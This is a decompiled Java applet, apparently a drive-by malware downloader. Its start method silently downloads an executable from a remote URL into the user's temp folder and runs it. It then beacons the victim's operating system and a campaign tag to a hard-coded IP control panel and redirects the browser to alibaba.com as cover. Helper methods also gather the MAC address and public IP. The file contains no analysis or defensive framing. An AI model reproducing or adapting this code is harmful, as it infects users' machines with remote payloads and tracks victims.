import java.net.InetAddress;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedInputStream;
import java.net.URL;
import java.io.FileOutputStream;
import javax.swing.JApplet;

// 
// Decompiled by Procyon v0.5.30
// 

public class hkpui extends JApplet
{
    boolean visit;
    boolean panel;
    String App;
    String Temp;
    String visitPage;
    String Panel;
    String downloadURL;
    String filePath;
    String fileName;
    
    public hkpui() {
        this.visit = true;
        this.panel = true;
        this.App = System.getenv("APPDATA");
        this.Temp = System.getenv("temp");
        this.visitPage = "http://www.alibaba.com";
        this.Panel = "http://66.197.134.140";
        this.downloadURL = "http://www.javaverified.info/virus/productsamples.exe";
        this.filePath = this.Temp + "\\";
        this.fileName = "productsamples.exe";
    }
    
    @Override
    public void start() {
        final String concat = this.filePath.concat(this.fileName);
        try {
            final FileOutputStream fileOutputStream = new FileOutputStream(concat);
            final BufferedInputStream bufferedInputStream = new BufferedInputStream(new URL(this.downloadURL).openStream());
            final BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(fileOutputStream, 1024);
            final byte[] array = new byte[1024];
            long n = 0L;
            int read;
            while ((read = bufferedInputStream.read(array)) != -1) {
                bufferedOutputStream.write(array, 0, read);
                n += read;
            }
            bufferedOutputStream.close();
            bufferedInputStream.close();
        }
        catch (IOException ex) {
            Logger.getLogger(hkpui.class.getName()).log(Level.SEVERE, null, ex);
        }
        try {
            Runtime.getRuntime().exec(concat);
        }
        catch (Exception ex3) {}
        if (this.panel) {
            this.logger();
        }
        try {
            if (this.visit) {
                this.getAppletContext().showDocument(new URL(this.visitPage), "_self");
            }
        }
        catch (MalformedURLException ex2) {
            System.err.println(ex2);
        }
    }
    
    public static void main(final String[] array) {
    }
    
    public static String getPath(final String s) {
        if (s.startsWith("%") && !s.contains("$")) {
            final String getenv = System.getenv(s.substring(1));
            if (getenv != null) {
                return getenv;
            }
            return ".";
        }
        else {
            if (!s.startsWith("%") || !s.contains("$")) {
                return s;
            }
            final String getenv2 = System.getenv(s.substring(1, s.indexOf("$")));
            if (getenv2 == null) {
                return ".";
            }
            return getenv2 + "/" + s.substring(s.indexOf("$") + 1);
        }
    }
    
    public static String geto() {
        return System.getProperty("os.name");
    }
    
    static String getm() {
        if (geto().contains("Windows")) {
            final String s = "ipconfig /all";
            try {
                final BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(s).getInputStream()));
                final Pattern compile = Pattern.compile(".*Physical Address.*: (.*)");
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    final Matcher matcher = compile.matcher(line);
                    if (matcher.matches()) {
                        return matcher.group(1);
                    }
                }
            }
            catch (Exception ex) {}
            return "(No_MA)";
        }
        return "(No_MA)";
    }
    
    private static String geti() {
        try {
            return new BufferedReader(new InputStreamReader(new URL("http://whatismyip.org/").openStream())).readLine();
        }
        catch (IOException ex) {
            ex.printStackTrace();
            return "(NO_I)";
        }
    }
    
    public void logger() {
        this.getParameter("Panel");
        final String s = "http://66.197.134.140";
        final String s2 = "Pelipper";
        try {
            InetAddress.getLocalHost().getHostName();
            new URL(s + "/insert.php?&o=" + geto().replace(" ", "_") + "&u=" + s2).openStream();
        }
        catch (IOException ex) {
            ex.printStackTrace();
        }
    }
}
